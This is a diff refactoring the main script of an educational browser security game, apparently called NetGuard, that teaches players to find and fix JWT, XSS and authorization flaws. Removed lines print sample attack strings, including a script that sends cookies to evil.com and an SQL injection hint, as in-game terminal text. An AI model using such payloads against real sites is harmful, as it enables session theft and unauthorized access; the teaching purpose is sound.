@@ -1,1132 +1,308 @@
-import { LEVELS, LEVEL_ORDER } from "./levels.js"
-import { getNetworkForLevel } from "./networks.js"
-import { JWTDecoder, SQLInjectionTester } from "./tools.js"
-import { COMMAND_IDS, STORAGE_KEYS } from "./constants.js"
-import { getLevelAndToolCommands } from "./levelHandlers.js"
+import { LEVEL_ORDER } from "./levels.js"
+import { GameState } from "./js/GameState.js"
+import { GameUI } from "./js/GameUI.js"
+import { CommandHandler } from "./js/CommandHandler.js"
+import { NPCManager } from "./js/NPCManager.js"
 
-// Game State
-const gameState = {
-  currentLevel: null,
-  currentNode: null,
-  networkNodes: [],
-  scannedNodes: new Set(),
-  cluesFound: new Set(),
-  vulnerabilitiesFixed: new Set(),
-  completedLevels: new Set(),
-  inProgress: false,
-}
+/**
+ * Main game class for NetGuard
+ * Orchestrates all game subsystems and handles game flow
+ */
+class NetGuardGame {
+  constructor() {
+    // Initialize subsystems
+    this.gameState = new GameState("1.0")
+    this.gameUI = new GameUI()
+    this.commandHandler = new CommandHandler(this.gameState, this.gameUI)
+    this.npcManager = new NPCManager(this.gameState, this.gameUI)
 
-// DOM Elements
-let levelSelectionEl, levelListEl, gameScreenEl, levelInfoEl, progressInfoEl, backButtonEl
-let networkMapEl, terminalOutputEl, availableCommandsEl
-let npcInfoEl, talkButtonEl
-let dialogModal, dialogNPC, dialogBody, dialogClose, dialogContinue
-let victoryModal, nextLevelBtn, backToLevelsBtn
-let toolModal, toolTitle, toolInput, toolInputLabel, toolOutput, toolClose, toolExecute
+    // Setup event listeners
+    this.setupEventListeners()
+    this.setupKeyboardNavigation()
 
-// Initialize Game
-function init() {
-  // Get DOM elements
-  levelSelectionEl = document.getElementById("level-selection")
-  levelListEl = document.getElementById("level-list")
-  gameScreenEl = document.getElementById("game-screen")
-  levelInfoEl = document.getElementById("level-info")
-  progressInfoEl = document.getElementById("progress-info")
-  backButtonEl = document.getElementById("back-button")
-
-  networkMapEl = document.getElementById("network-map")
-  terminalOutputEl = document.getElementById("terminal-output")
-  availableCommandsEl = document.getElementById("available-commands")
-  npcInfoEl = document.getElementById("npc-info")
-  talkButtonEl = document.getElementById("talk-button")
-
-  dialogModal = document.getElementById("dialog-modal")
-  dialogNPC = document.getElementById("dialog-npc")
-  dialogBody = document.getElementById("dialog-body")
-  dialogClose = document.getElementById("dialog-close")
-  dialogContinue = document.getElementById("dialog-continue")
-
-  victoryModal = document.getElementById("victory-modal")
-  nextLevelBtn = document.getElementById("next-level")
-  backToLevelsBtn = document.getElementById("back-to-levels")
-
-  toolModal = document.getElementById("tool-modal")
-  toolTitle = document.getElementById("tool-title")
-  toolInput = document.getElementById("tool-input")
-  toolInputLabel = document.getElementById("tool-input-label")
-  toolOutput = document.getElementById("tool-output")
-  toolClose = document.getElementById("tool-close")
-  toolExecute = document.getElementById("tool-execute")
-
-  const resetButton = document.getElementById("reset-button")
-
-  // Setup event listeners
-  dialogClose.addEventListener("click", () => closeDialog())
-  dialogContinue.addEventListener("click", () => closeDialog())
-  nextLevelBtn.addEventListener("click", () => goToNextLevel())
-  backToLevelsBtn.addEventListener("click", () => showLevelSelection())
-  backButtonEl.addEventListener("click", () => showLevelSelection())
-  talkButtonEl.addEventListener("click", () => talkToNPC())
-  toolClose.addEventListener("click", () => closeTool())
-  toolExecute.addEventListener("click", () => executeTool())
-  resetButton.addEventListener("click", () => resetProgress())
-
-  // Setup keyboard navigation
-  setupKeyboardNavigation()
-
-  // Load saved game state
-  loadGameState()
-
-  // Show level selection
-  showLevelSelection()
-}
-
-// Save Game State
-function saveGameState() {
-  const saveData = {
-    completedLevels: Array.from(gameState.completedLevels),
-    timestamp: Date.now(),
-  }
-  localStorage.setItem(STORAGE_KEYS.GAME_SAVE, JSON.stringify(saveData))
-}
-
-// Save Per-Level Progress
-function saveLevelProgress() {
-  if (!gameState.currentLevel || !gameState.inProgress) return
-
-  const levelId = gameState.currentLevel.id
-  const progressData = JSON.parse(localStorage.getItem(STORAGE_KEYS.LEVEL_PROGRESS) || "{}")
-
-  progressData[levelId] = {
-    cluesFound: Array.from(gameState.cluesFound),
-    vulnerabilitiesFixed: Array.from(gameState.vulnerabilitiesFixed),
-    scannedNodes: Array.from(gameState.scannedNodes),
+    // Show level selection
+    this.showLevelSelection()
   }
 
-  localStorage.setItem(STORAGE_KEYS.LEVEL_PROGRESS, JSON.stringify(progressData))
-}
+  /**
+   * Setup event listeners for UI elements
+   */
+  setupEventListeners() {
+    const elements = this.gameUI.elements
 
-// Load Per-Level Progress
-function loadLevelProgress(levelId) {
-  try {
-    const progressData = JSON.parse(localStorage.getItem(STORAGE_KEYS.LEVEL_PROGRESS) || "{}")
-    return progressData[levelId] || null
-  } catch (e) {
-    console.error("Failed to load level progress:", e)
-    return null
-  }
-}
+    // Dialog modal controls
+    elements.dialogClose.addEventListener("click", () => this.npcManager.closeDialog())
+    elements.dialogContinue.addEventListener("click", () => this.npcManager.closeDialog())
 
-// Clear Level Progress
-function clearLevelProgress(levelId) {
-  try {
-    const progressData = JSON.parse(localStorage.getItem(STORAGE_KEYS.LEVEL_PROGRESS) || "{}")
-    delete progressData[levelId]
-    localStorage.setItem(STORAGE_KEYS.LEVEL_PROGRESS, JSON.stringify(progressData))
-  } catch (e) {
-    console.error("Failed to clear level progress:", e)
-  }
-}
+    // Victory modal controls
+    elements.nextLevelBtn.addEventListener("click", () => this.goToNextLevel())
+    elements.backToLevelsBtn.addEventListener("click", () => this.showLevelSelection())
 
-// Load Game State
-function loadGameState() {
-  try {
-    const saved = localStorage.getItem(STORAGE_KEYS.GAME_SAVE)
-    if (saved) {
-      const data = JSON.parse(saved)
-      data.completedLevels.forEach((id) => gameState.completedLevels.add(id))
-    }
-  } catch (e) {
-    console.error("Failed to load save data:", e)
-  }
+    // Navigation controls
+    elements.backButtonEl.addEventListener("click", () => this.showLevelSelection())
+    elements.talkButtonEl.addEventListener("click", () => this.npcManager.talkToNPC())
 
-  // Handle query parameters for testing
-  handleQueryParameters()
-}
+    // Tool modal controls
+    elements.toolClose.addEventListener("click", () => this.gameUI.closeTool())
+    elements.toolExecute.addEventListener("click", () => this.commandHandler.executeTool())
 
-// Handle Query Parameters
-function handleQueryParameters() {
-  const params = new URLSearchParams(window.location.search)
+    // Reset button
+    elements.resetButton.addEventListener("click", () => this.resetProgress())
 
-  // Unlock levels: ?unlock=all
-  const unlockParam = params.get("unlock")
-  if (unlockParam === "all") {
-    LEVEL_ORDER.forEach((levelId) => {
-      gameState.completedLevels.add(levelId)
-    })
-    console.log("🔓 All levels unlocked for testing")
-  }
-}
-
-// Reset Progress
-function resetProgress() {
-  if (confirm("⚠️ Reset all progress?\n\nThis will delete your save data and cannot be undone.")) {
-    localStorage.removeItem(STORAGE_KEYS.GAME_SAVE)
-    localStorage.removeItem(STORAGE_KEYS.LEVEL_PROGRESS)
-    gameState.completedLevels.clear()
-    renderLevelList()
-    addTerminalLine("Progress reset successfully.", "success")
-  }
-}
-
-// Setup Keyboard Navigation
-function setupKeyboardNavigation() {
-  document.addEventListener("keydown", (e) => {
-    // Escape - close modals
-    if (e.key === "Escape") {
-      if (dialogModal.classList.contains("show")) {
-        closeDialog()
-        return
-      }
-      if (victoryModal.classList.contains("show")) {
-        showLevelSelection()
-        return
-      }
-      if (toolModal.classList.contains("show")) {
-        closeTool()
-        return
-      }
-    }
-
-    // Enter - activate focused element
-    if (e.key === "Enter") {
-      const focused = document.activeElement
-
-      // Level card selection
-      if (focused.classList.contains("level-card") && !focused.classList.contains("locked")) {
-        focused.click()
-        return
-      }
-
-      // Command button activation
-      if (focused.classList.contains("command-btn") && !focused.disabled) {
-        focused.click()
-        return
-      }
-
-      // Network node selection
-      if (focused.classList.contains("network-node")) {
-        focused.click()
-        return
-      }
-    }
-
-    // Arrow keys - navigate level cards when on level selection screen
-    if (levelSelectionEl.style.display !== "none") {
-      const levelCards = Array.from(document.querySelectorAll(".level-card:not(.locked)"))
-      const currentIndex = levelCards.indexOf(document.activeElement)
-
-      if (e.key === "ArrowRight" && currentIndex >= 0 && currentIndex < levelCards.length - 1) {
-        levelCards[currentIndex + 1].focus()
-        e.preventDefault()
-      } else if (e.key === "ArrowLeft" && currentIndex > 0) {
-        levelCards[currentIndex - 1].focus()
-        e.preventDefault()
-      } else if (
-        (e.key === "ArrowRight" || e.key === "ArrowDown") &&
-        currentIndex === -1 &&
-        levelCards.length > 0
-      ) {
-        // No card focused, focus first one
-        levelCards[0].focus()
-        e.preventDefault()
-      }
-    }
-
-    // Arrow keys - navigate network nodes when in game
-    if (gameScreenEl.style.display !== "none") {
-      const nodes = Array.from(document.querySelectorAll(".network-node"))
-      const currentIndex = nodes.indexOf(document.activeElement)
-
-      if (e.key === "ArrowDown" && currentIndex >= 0 && currentIndex < nodes.length - 1) {
-        nodes[currentIndex + 1].focus()
-        e.preventDefault()
-      } else if (e.key === "ArrowUp" && currentIndex > 0) {
-        nodes[currentIndex - 1].focus()
-        e.preventDefault()
-      } else if (
-        (e.key === "ArrowDown" || e.key === "ArrowRight") &&
-        currentIndex === -1 &&
-        nodes.length > 0
-      ) {
-        // No node focused, focus first one
-        nodes[0].focus()
-        e.preventDefault()
-      }
-    }
-  })
-}
-
-// Show Level Selection Screen
-function showLevelSelection() {
-  levelSelectionEl.style.display = "block"
-  gameScreenEl.style.display = "none"
-  victoryModal.classList.remove("show")
-  renderLevelList()
-}
-
-// Render Level Selection
-function renderLevelList() {
-  levelListEl.innerHTML = ""
-
-  LEVEL_ORDER.forEach((levelId, index) => {
-    const level = LEVELS[levelId]
-    const isLocked = index > 0 && !gameState.completedLevels.has(LEVEL_ORDER[index - 1])
-    const isCompleted = gameState.completedLevels.has(levelId)
-
-    const card = document.createElement("div")
-    card.className = `level-card ${isLocked ? "locked" : ""}`
-
-    // Make keyboard accessible
-    if (!isLocked) {
-      card.tabIndex = 0
-      card.setAttribute("role", "button")
-      card.setAttribute("aria-label", `Start level ${level.id}: ${level.name}`)
-    }
-
-    card.innerHTML = `
-      <div class="level-card-header">
-        <span class="level-number">Level ${level.id}</span>
-        <span class="level-difficulty difficulty-${level.difficulty.toLowerCase()}">
-          ${level.difficulty}
-        </span>
-      </div>
-      <div class="level-name">${level.name}</div>
-      <div class="level-description">${level.description}</div>
-      <div class="level-concepts">
-        ${level.concepts.map((c) => `<span class="concept-tag">${c}</span>`).join("")}
-      </div>
-      ${isCompleted ? '<div style="margin-top: 15px; color: var(--accent-green);">✅ Completed</div>' : ""}
-      ${isLocked ? '<div style="margin-top: 15px; color: var(--text-secondary);">🔒 Complete previous levels to unlock</div>' : ""}
-    `
-
-    if (!isLocked) {
-      card.addEventListener("click", () => startLevel(levelId))
-    }
-
-    levelListEl.appendChild(card)
-  })
-}
-
-// Start a Level
-function startLevel(levelId) {
-  gameState.currentLevel = LEVELS[levelId]
-  gameState.networkNodes = JSON.parse(JSON.stringify(getNetworkForLevel(levelId))) // Deep copy
-  gameState.currentNode = null
-  gameState.scannedNodes = new Set()
-  gameState.cluesFound = new Set()
-  gameState.vulnerabilitiesFixed = new Set()
-  gameState.inProgress = true
-
-  // Load saved progress if available
-  const savedProgress = loadLevelProgress(levelId)
-  if (savedProgress) {
-    savedProgress.cluesFound?.forEach((clue) => gameState.cluesFound.add(clue))
-    savedProgress.vulnerabilitiesFixed?.forEach((vuln) => gameState.vulnerabilitiesFixed.add(vuln))
-    savedProgress.scannedNodes?.forEach((node) => gameState.scannedNodes.add(node))
-
-    // Restore node statuses based on saved progress
-    gameState.networkNodes.forEach((node) => {
-      // Mark scanned nodes as healthy (unless they have issues)
-      if (gameState.scannedNodes.has(node.id)) {
-        if (node.status === "unexamined") {
-          node.status = "healthy"
-        }
+    // Level card clicks (delegated)
+    elements.levelListEl.addEventListener("click", (e) => {
+      const card = e.target.closest(".level-card")
+      if (card && !card.classList.contains("locked")) {
+        const levelId = LEVEL_ORDER[Array.from(elements.levelListEl.children).indexOf(card)]
+        this.startLevel(levelId)
       }
     })
 
-    // Update node statuses based on vulnerabilities found and fixed
-    if (gameState.vulnerabilityFound || gameState.cluesFound.size > 0) {
-      const authNode = gameState.networkNodes.find((n) => n.id === "auth")
-      if (authNode && gameState.cluesFound.has("auth_config")) {
-        authNode.status = gameState.vulnerabilitiesFixed.has("jwt_expiration") ? "healthy" : "compromised"
+    // Network node clicks (delegated)
+    elements.networkMapEl.addEventListener("click", (e) => {
+      const node = e.target.closest(".network-node")
+      if (node) {
+        const nodeId = node.dataset.nodeId
+        this.selectNode(nodeId)
       }
-
-      const commentNode = gameState.networkNodes.find((n) => n.id === "comment-system")
-      if (commentNode && gameState.vulnerabilitiesFixed.has("stored_xss")) {
-        commentNode.status = "healthy"
-      }
-
-      const webNode = gameState.networkNodes.find((n) => n.id === "web-server")
-      if (webNode && gameState.vulnerabilitiesFixed.has("missing_csp")) {
-        webNode.status = "healthy"
-      }
-
-      const adminNode = gameState.networkNodes.find((n) => n.id === "admin-panel")
-      if (adminNode && gameState.vulnerabilitiesFixed.has("auth_bypass")) {
-        adminNode.status = "healthy"
-      }
-
-      const sessionNode = gameState.networkNodes.find((n) => n.id === "session-store")
-      if (sessionNode && gameState.vulnerabilitiesFixed.has("broken_access_control")) {
-        sessionNode.status = "healthy"
-      }
-    }
-  }
-
-  levelSelectionEl.style.display = "none"
-  gameScreenEl.style.display = "block"
-
-  levelInfoEl.textContent = `Level ${gameState.currentLevel.id}: ${gameState.currentLevel.name}`
-  updateProgressInfo()
-
-  // Initialize terminal
-  terminalOutputEl.innerHTML = ""
-  addTerminalLine("NetGuard Security Terminal v2.0", "")
-  addTerminalLine("---", "")
-  addTerminalLine("🎯 MISSION:", "narrative")
-  addTerminalLine(gameState.currentLevel.description, "narrative")
-  addTerminalLine("", "")
-  addTerminalLine("OBJECTIVES:", "info")
-  gameState.currentLevel.concepts.forEach((concept) => {
-    addTerminalLine(`• ${concept}`, "info")
-  })
-  addTerminalLine("---", "")
-
-  if (savedProgress) {
-    addTerminalLine("📁 Progress restored from previous session", "success")
-    addTerminalLine("---", "")
-  }
-
-  addTerminalLine("Click a network node to SSH into it and investigate.", "info")
-
-  renderNetworkMap()
-  renderCommands()
-}
-
-// Update Progress Info
-function updateProgressInfo() {
-  const cluesFound = gameState.cluesFound.size
-  const totalClues = gameState.currentLevel.requiredClues.length
-  const vulnsFixed = gameState.vulnerabilitiesFixed.size
-  const totalVulns = gameState.currentLevel.vulnerabilities.length
-
-  progressInfoEl.textContent = `Clues: ${cluesFound}/${totalClues} | Vulnerabilities Fixed: ${vulnsFixed}/${totalVulns}`
-}
-
-// Render Network Map
-function renderNetworkMap() {
-  networkMapEl.innerHTML = ""
-
-  gameState.networkNodes.forEach((node) => {
-    const nodeEl = document.createElement("div")
-    nodeEl.className = `network-node ${node.status}`
-    if (gameState.currentNode === node.id) {
-      nodeEl.classList.add("selected")
-    }
-
-    // Make keyboard accessible
-    nodeEl.tabIndex = 0
-    nodeEl.setAttribute("role", "button")
-    nodeEl.setAttribute("aria-label", `Connect to ${node.name} - ${node.description}`)
-
-    nodeEl.innerHTML = `
-      <div class="node-header">
-        <div class="node-name">${node.name}</div>
-        <div class="status-indicator">${getStatusEmoji(node.status)}</div>
-      </div>
-      <div class="node-type">${node.hostname}</div>
-      <div class="node-description">${node.description}</div>
-    `
-
-    nodeEl.addEventListener("click", () => selectNode(node.id))
-    networkMapEl.appendChild(nodeEl)
-  })
-}
-
-// Get Status Emoji
-function getStatusEmoji(status) {
-  const statusMap = {
-    healthy: "🟢",
-    suspicious: "🟡",
-    compromised: "🔴",
-    unexamined: "🔵",
-  }
-  return statusMap[status] || "🔵"
-}
-
-// Select Node (SSH into it)
-function selectNode(nodeId) {
-  const node = gameState.networkNodes.find((n) => n.id === nodeId)
-  const wasConnected = gameState.currentNode !== null
-
-  // If already connected to a different node, disconnect first
-  if (wasConnected && gameState.currentNode !== nodeId) {
-    addTerminalLine("", "")
-    addTerminalLine("Connection closed.", "info")
-    addTerminalLine("---", "")
-  }
-
-  gameState.currentNode = nodeId
-
-  // SSH connection message
-  addTerminalLine(`ssh user@${node.hostname}`, "command")
-  addTerminalLine(`Connected to ${node.hostname}`, "info")
-  addTerminalLine(`System load: ${node.systemLoad || "0.15"}  Memory: ${node.memoryUsage || "42"}%`, "info")
-  addTerminalLine("", "")
-
-  updateNPCPanel(node)
-  renderNetworkMap()
-  renderCommands()
-  scrollTerminalToBottom()
-}
-
-// Update NPC Panel
-function updateNPCPanel(node) {
-  if (node && node.npc) {
-    npcInfoEl.textContent = node.npc.name
-    talkButtonEl.disabled = false
-    talkButtonEl.textContent = "Talk to Personnel"
-  } else {
-    npcInfoEl.textContent = "No personnel available at this location"
-    talkButtonEl.disabled = true
-  }
-}
-
-// Render Commands
-function renderCommands() {
-  availableCommandsEl.innerHTML = ""
-
-  const commands = getAvailableCommands()
-
-  commands.forEach((cmd) => {
-    const button = document.createElement("button")
-    button.className = "command-button"
-    button.textContent = cmd.name
-    button.title = cmd.description
-
-    if (cmd.disabled) {
-      button.disabled = true
-    }
-
-    button.addEventListener("click", () => executeCommand(cmd.id))
-    availableCommandsEl.appendChild(button)
-  })
-}
-
-// Get Available Commands based on current state and level
-function getAvailableCommands() {
-  const baseCommands = [
-    {
-      id: COMMAND_IDS.SCAN,
-      name: "systemctl status",
-      description: "Check service status and system info",
-      disabled: !gameState.currentNode,
-    },
-    {
-      id: COMMAND_IDS.LOGS,
-      name: "tail -f /var/log/system.log",
-      description: "Review system logs",
-      disabled: !gameState.currentNode,
-    },
-    {
-      id: COMMAND_IDS.EXIT,
-      name: "exit",
-      description: "Disconnect from current host",
-      disabled: !gameState.currentNode,
-    },
-  ]
-
-  // Get level-specific and tool commands from handlers
-  const levelCommands = getLevelAndToolCommands(gameState)
-
-  return [...baseCommands, ...levelCommands]
-}
-
-// Execute Command
-function executeCommand(commandId) {
-  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode)
-  const cmd = getAvailableCommands().find((c) => c.id === commandId)
-
-  if (cmd.disabled) {
-    addTerminalLine(`${cmd.name}: command not available in current context`, "error")
-    return
-  }
-
-  // Show command without extra $ prefix (addTerminalLine with "command" class adds it)
-  addTerminalLine(cmd.name, "command")
-
-  switch (commandId) {
-    case "scan":
-      scanNode(node)
-      break
-    case "logs":
-      checkLogs(node)
-      break
-    case "analyze-tokens":
-      analyzeTokens(node)
-      break
-    case "decode-jwt":
-      openTool("echo <token> | base64 -d")
-      break
-    case "fix-jwt":
-      fixJWTExpiration()
-      break
-    case "analyze-xss":
-      analyzeXSS()
-      break
-    case "fix-xss":
-      fixXSS()
-      break
-    case "add-csp":
-      addCSP()
-      break
-    case "check-auth":
-      checkAuth()
-      break
-    case "fix-auth":
-      fixAuth()
-      break
-    case "fix-session":
-      fixSession()
-      break
-    case "exit":
-      disconnectNode()
-      break
-  }
-
-  scrollTerminalToBottom()
-  updateProgressInfo()
-  renderCommands()
-}
-
-// Scan Node
-function scanNode(node) {
-  if (gameState.scannedNodes.has(node.id)) {
-    addTerminalLine("System already scanned. Use other commands for details.", "info")
-    return
-  }
-
-  gameState.scannedNodes.add(node.id)
-
-  // Simulate systemctl status output
-  addTerminalLine(`● ${node.type}.service - ${node.name}`, "")
-  addTerminalLine(`   Loaded: loaded (/etc/systemd/system/${node.type}.service; enabled)`, "")
-  addTerminalLine(`   Active: active (running)`, "success")
-  addTerminalLine(`   Main PID: ${Math.floor(Math.random() * 50000 + 1000)}`, "")
-  addTerminalLine("", "")
-  addTerminalLine(node.scanResult, "")
-  addTerminalLine("", "")
-
-  if (node.status === "unexamined") {
-    node.status = "healthy"
-  }
-
-  renderNetworkMap()
-  saveLevelProgress()
-}
-
-// Check Logs
-function checkLogs(node) {
-  addTerminalLine(node.logs, node.clue ? "warning" : "")
-  addTerminalLine("", "")
-
-  // Add clue if this node has one
-  if (node.clue && !gameState.cluesFound.has(node.clue)) {
-    gameState.cluesFound.add(node.clue)
-    const clueDesc = gameState.currentLevel.clueDescriptions[node.clue]
-    addTerminalLine(`🔍 CLUE FOUND: ${clueDesc}`, "success")
-    addTerminalLine(
-      `Clues discovered: ${gameState.cluesFound.size}/${gameState.currentLevel.requiredClues.length}`,
-      "info",
-    )
-    addTerminalLine("", "")
-
-    if (node.id === "auth" && node.clue === "auth_config") {
-      addTerminalLine("Try running ./analyze-tokens.sh to investigate further", "info")
-      node.status = "suspicious"
-      renderNetworkMap()
-    }
-
-    saveLevelProgress()
-  }
-}
-
-// Analyze Tokens (Level 1)
-function analyzeTokens(node) {
-  if (!node.tokenData) {
-    addTerminalLine("No token data available.", "info")
-    return
-  }
-
-  // Check if player has found enough clues
-  const hasRequiredClues = node.tokenData.requiresClues.every((clue) =>
-    gameState.cluesFound.has(clue),
-  )
-
-  if (!hasRequiredClues) {
-    const missingClues = node.tokenData.requiresClues.filter(
-      (clue) => !gameState.cluesFound.has(clue),
-    )
-    addTerminalLine("Running token analysis...", "info")
-    addTerminalLine("---", "")
-    addTerminalLine("Found several active JWT tokens with valid signatures.", "")
-    addTerminalLine("Token claims include standard fields: sub, iat, exp, role.", "")
-    addTerminalLine("---", "")
-    addTerminalLine("⚠️ Need more context to identify issues.", "warning")
-    addTerminalLine(
-      "Hint: Investigate other systems to gather clues about suspicious activity.",
-      "info",
-    )
-    const missingDesc = missingClues.map((c) => gameState.currentLevel.clueDescriptions[c])
-    addTerminalLine(`Missing clues: ${missingDesc.join(", ")}`, "info")
-    return
-  }
-
-  addTerminalLine("Running comprehensive token analysis...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine(node.tokenData.details, "error")
-  addTerminalLine("---", "")
-  addTerminalLine("🔴 VULNERABILITY IDENTIFIED!", "error")
-  addTerminalLine("An expired contractor token is still being accepted.", "error")
-  addTerminalLine("---", "")
-  addTerminalLine("SECURITY LESSON:", "info")
-  addTerminalLine(node.tokenData.solution, "info")
-  addTerminalLine("---", "")
-  addTerminalLine("Run enable-jwt-expiration to fix this vulnerability.", "warning")
-
-  if (node.sampleToken) {
-    addTerminalLine("", "")
-    addTerminalLine(
-      `Sample token available. Use the decode command to analyze it manually.`,
-      "info",
-    )
-  }
-
-  // Mark that vulnerability has been identified and understood
-  gameState.vulnerabilityFound = true
-  node.status = "compromised"
-  renderNetworkMap()
-  renderCommands() // Re-render to enable fix-jwt button
-}
-
-// Open Interactive Tool
-function openTool(toolName) {
-  toolTitle.textContent = toolName
-  toolInput.value = ""
-  toolOutput.textContent = ""
-
-  // Set context-specific hints
-  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode)
-
-  if (toolName.includes("base64") && node?.sampleToken) {
-    toolInputLabel.textContent = "JWT Token or Payload:"
-    toolInput.placeholder = "Paste full JWT token or just the payload (middle part between dots)..."
-    toolInput.value = node.sampleToken // Full token
-    toolOutput.textContent =
-      "Hint: JWT tokens have 3 parts (header.payload.signature). Paste the full token or just the middle part to see the payload."
-  } else if (toolName.includes("psql")) {
-    toolInputLabel.textContent = "SQL Query:"
-    toolInput.placeholder = "e.g., SELECT * FROM users WHERE id = '1' OR '1'='1'"
-    toolOutput.textContent =
-      "Try SQL injection payloads to see how they exploit vulnerabilities.\nExample: ' OR '1'='1"
-  }
-
-  toolModal.classList.add("show")
-}
-
-// Close Tool Modal
-function closeTool() {
-  toolModal.classList.remove("show")
-}
-
-// Execute Interactive Tool
-function executeTool() {
-  const toolName = toolTitle.textContent
-  const input = toolInput.value.trim()
-
-  if (!input) {
-    toolOutput.textContent = "Error: Input is required"
-    return
-  }
-
-  toolOutput.textContent = "Processing...\n"
-
-  setTimeout(() => {
-    try {
-      if (toolName.includes("base64")) {
-        // Check if input is a full JWT (3 parts) or just the payload
-        const parts = input.split(".")
-        let decoded
-        if (parts.length === 3) {
-          // Full JWT token
-          decoded = JWTDecoder.decode(input)
-        } else {
-          // Just the payload part - decode it directly
-          try {
-            const payloadData = JSON.parse(atob(input))
-            decoded = {
-              header: { note: "Header not provided - only payload decoded" },
-              payload: payloadData,
-              signature: "Not provided",
-            }
-          } catch (e) {
-            decoded = { error: "Invalid base64 or JSON in payload: " + e.message }
-          }
-        }
-        toolOutput.textContent = JWTDecoder.formatDecoded(decoded)
-      } else if (toolName.includes("psql")) {
-        const originalQuery = "SELECT * FROM users WHERE id = '?'"
-        const result = SQLInjectionTester.testPayload(input, originalQuery)
-
-        if (result.vulnerable) {
-          toolOutput.textContent = result.explanation + "\n\n" + result.fix
-        } else {
-          toolOutput.textContent = result.message
-        }
-      }
-    } catch (err) {
-      toolOutput.textContent = `Error: ${err.message}`
-    }
-  }, 500)
-}
-
-// Fix JWT Expiration (Level 1)
-function fixJWTExpiration() {
-  if (gameState.vulnerabilitiesFixed.has("jwt_expiration")) {
-    addTerminalLine("JWT expiration validation already enabled.", "info")
-    return
-  }
-
-  addTerminalLine("Enabling JWT expiration validation...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("✅ Updated jwt.config.js", "success")
-  addTerminalLine("✅ Restarted authentication service", "success")
-  addTerminalLine("✅ Expired tokens now rejected", "success")
-  addTerminalLine("---", "")
-  addTerminalLine("🛡️ Vulnerability patched!", "success")
-
-  gameState.vulnerabilitiesFixed.add("jwt_expiration")
-
-  const authNode = gameState.networkNodes.find((n) => n.id === "auth")
-  if (authNode) authNode.status = "healthy"
-
-  renderNetworkMap()
-  saveLevelProgress()
-  checkLevelComplete()
-}
-
-// Level 2: XSS Functions
-function analyzeXSS() {
-  addTerminalLine("Searching for malicious scripts in database...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("Found 3 comments containing <script> tags:", "error")
-  addTerminalLine(
-    "1. <script>window.location='https://evil.com?cookie='+document.cookie</script>",
-    "error",
-  )
-  addTerminalLine("2. <img src=x onerror='steal_cookies()'>", "error")
-  addTerminalLine("3. <iframe src='javascript:malicious()'>", "error")
-  addTerminalLine("---", "")
-  addTerminalLine("🔴 STORED XSS VULNERABILITY!", "error")
-  addTerminalLine("These scripts will execute in every user's browser!", "error")
-}
-
-function fixXSS() {
-  if (gameState.vulnerabilitiesFixed.has("stored_xss")) {
-    addTerminalLine("XSS vulnerability already fixed.", "info")
-    return
-  }
-
-  addTerminalLine("Sanitizing user input...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("✅ Replaced innerHTML with textContent", "success")
-  addTerminalLine("✅ Implemented DOMPurify sanitization", "success")
-  addTerminalLine("✅ Removed malicious scripts from database", "success")
-  addTerminalLine("---", "")
-  addTerminalLine("🛡️ XSS vulnerability eliminated!", "success")
-
-  gameState.vulnerabilitiesFixed.add("stored_xss")
-  gameState.vulnerabilitiesFixed.add("reflected_xss")
-
-  const commentNode = gameState.networkNodes.find((n) => n.id === "comment-system")
-  if (commentNode) commentNode.status = "healthy"
-
-  renderNetworkMap()
-  saveLevelProgress()
-  checkLevelComplete()
-}
-
-function addCSP() {
-  if (gameState.vulnerabilitiesFixed.has("missing_csp")) {
-    addTerminalLine("Content Security Policy already configured.", "info")
-    return
-  }
-
-  addTerminalLine("Adding Content Security Policy...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("✅ Added CSP header to server config", "success")
-  addTerminalLine("✅ Restricted script sources to 'self'", "success")
-  addTerminalLine("✅ Disabled inline scripts", "success")
-  addTerminalLine("---", "")
-  addTerminalLine("🛡️ CSP will block XSS even if sanitization fails!", "success")
-
-  gameState.vulnerabilitiesFixed.add("missing_csp")
-
-  const webNode = gameState.networkNodes.find((n) => n.id === "web-server")
-  if (webNode) webNode.status = "healthy"
-
-  renderNetworkMap()
-  saveLevelProgress()
-  checkLevelComplete()
-}
-
-// Level 3: Authentication Bypass Functions
-function checkAuth() {
-  addTerminalLine("Auditing authorization checks...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("⚠️ Admin panel: Only checks login, NOT role!", "error")
-  addTerminalLine("⚠️ API endpoints: Missing ownership validation!", "error")
-  addTerminalLine("⚠️ Session tokens: Predictable format detected!", "error")
-  addTerminalLine("---", "")
-  addTerminalLine("Attack Chain Identified:", "warning")
-  addTerminalLine("1. Regular user accesses admin panel (no role check)", "warning")
-  addTerminalLine("2. User modifies other users' data (IDOR)", "warning")
-  addTerminalLine("3. Attacker forges session tokens (predictable IDs)", "warning")
-  addTerminalLine("4. Privilege escalation to admin complete", "warning")
-}
-
-function fixAuth() {
-  if (gameState.vulnerabilitiesFixed.has("auth_bypass")) {
-    addTerminalLine("Authorization checks already fixed.", "info")
-    return
-  }
-
-  addTerminalLine("Adding proper authorization checks...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("✅ Added role-based access control (RBAC)", "success")
-  addTerminalLine("✅ Implemented object-level authorization", "success")
-  addTerminalLine("✅ Admin endpoints require 'admin' role", "success")
-  addTerminalLine("---", "")
-  addTerminalLine("🛡️ Authorization bypass fixed!", "success")
-
-  gameState.vulnerabilitiesFixed.add("auth_bypass")
-
-  const adminNode = gameState.networkNodes.find((n) => n.id === "admin-panel")
-  if (adminNode) adminNode.status = "healthy"
-
-  renderNetworkMap()
-  saveLevelProgress()
-  checkLevelComplete()
-}
-
-function fixSession() {
-  if (gameState.vulnerabilitiesFixed.has("broken_access_control")) {
-    addTerminalLine("Session tokens already secured.", "info")
-    return
-  }
-
-  addTerminalLine("Securing session tokens...", "info")
-  addTerminalLine("---", "")
-  addTerminalLine("✅ Using crypto.randomBytes() for session IDs", "success")
-  addTerminalLine("✅ Invalidated all existing sessions", "success")
-  addTerminalLine("✅ Added session rotation on privilege change", "success")
-  addTerminalLine("---", "")
-  addTerminalLine("🛡️ Session hijacking vulnerability eliminated!", "success")
-
-  gameState.vulnerabilitiesFixed.add("broken_access_control")
-
-  const sessionNode = gameState.networkNodes.find((n) => n.id === "session-store")
